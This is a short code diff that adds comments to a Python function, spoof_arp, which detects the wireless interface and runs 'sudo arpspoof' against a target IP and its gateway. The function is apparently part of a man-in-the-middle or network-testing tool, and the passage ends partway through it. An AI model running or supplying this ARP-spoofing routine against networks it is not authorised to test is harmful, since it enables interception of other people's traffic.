@@ -1,8 +1,12 @@
 import subprocess
 
+# Function for spoofing the target
 def spoof_arp(target_ip, target_gateway):
+    # Display the interface name 
     result = subprocess.run('iw dev | grep Interface | cut -f 2 -d " "', shell=True, capture_output=True, text=True)
     iface = result.stdout.strip('\n')
+
+    # Start arpspoof command
     print("\n\033[35mStart ARP spoofing...")
     spoof = subprocess.Popen(['sudo', 'arpspoof', '-i', f'{iface}', '-t', f'{target_ip}', '-r', f'{target_gateway}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     
